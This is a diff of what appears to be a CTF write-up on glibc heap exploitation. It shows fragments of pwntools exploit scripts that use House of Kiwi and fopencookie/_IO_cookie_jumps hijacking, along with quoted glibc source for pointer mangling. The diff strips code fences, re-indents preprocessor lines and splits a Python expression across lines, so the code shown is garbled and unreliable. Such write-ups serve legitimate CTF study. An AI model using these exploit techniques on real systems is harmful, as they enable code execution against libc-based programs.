@@ -126,7 +126,8 @@ all_payload = ""
 
 def ROL(content, key):
     tmp = bin(content)[2:].rjust(64, '0')
-    return int(tmp[key:] + tmp[:key], 2)
+    return int(tmp[key:] + tmp[:
+key], 2)
 
 def add(idx, size):
     global all_payload
@@ -401,19 +402,14 @@ static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue),
 };
-```
-
-
-
-```
 static ssize_t
 _IO_cookie_read (FILE *fp, void *buf, ssize_t size)
 {
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_read_function_t *read_cb = cfile->__io_functions.read;
-#ifdef PTR_DEMANGLE
+    #ifdef PTR_DEMANGLE
  PTR_DEMANGLE (read_cb);
-#endif
+    #endif
 
  if (read_cb == NULL)
    return -1;
@@ -426,9 +422,9 @@ _IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
 {
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_write_function_t *write_cb = cfile->__io_functions.write;
-#ifdef PTR_DEMANGLE
+    #ifdef PTR_DEMANGLE
  PTR_DEMANGLE (write_cb);
-#endif
+    #endif
 
  if (write_cb == NULL)
   {
@@ -448,9 +444,9 @@ _IO_cookie_seek (FILE *fp, off64_t offset, int dir)
 {
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
-#ifdef PTR_DEMANGLE
+    #ifdef PTR_DEMANGLE
  PTR_DEMANGLE (seek_cb);
-#endif
+    #endif
 
  return ((seek_cb == NULL
    || (seek_cb (cfile->__cookie, &offset, dir)
@@ -464,20 +460,15 @@ _IO_cookie_close (FILE *fp)
 {
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_close_function_t *close_cb = cfile->__io_functions.close;
-#ifdef PTR_DEMANGLE
+    #ifdef PTR_DEMANGLE
  PTR_DEMANGLE (close_cb);
-#endif
+    #endif
 
  if (close_cb == NULL)
    return 0;
 
  return close_cb (cfile->__cookie);
 }
-```
-
-
-
-```
 /* Special file type for fopencookie function. */
 struct _IO_cookie_file
 {
@@ -493,20 +484,10 @@ typedef struct _IO_cookie_io_functions_t
  cookie_seek_function_t *seek;/* Seek/tell file position. */
  cookie_close_function_t *close;/* Close file. */
 } cookie_io_functions_t;
-```
-
-
-
-```
 extern uintptr_t __pointer_chk_guard attribute_relro;
 # define PTR_MANGLE(var) 
  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
 # define PTR_DEMANGLE(var) PTR_MANGLE (var)
-```
-
-
-
-```
 from pwn import *
 
 context.log_level = "debug"
@@ -518,7 +499,8 @@ all_payload = ""
 
 def ROL(content, key):
     tmp = bin(content)[2:].rjust(64, '0')
-    return int(tmp[key:] + tmp[:key], 2)
+    return int(tmp[key:] + tmp[:
+key], 2)
 
 def add(idx, size):
     global all_payload
@@ -669,11 +651,6 @@ add(8, 0x450)  # House OF Kiwi
 # gdb.attach(sh, "b _IO_cookie_write")
 run_opcode()
 sh.interactive()
-```
-
-
-
-```
 from pwn import*
 rol = lambda val, r_bits, max_bits: 
     (val << r_bits%max_bits) & (2**max_bits-1) | 
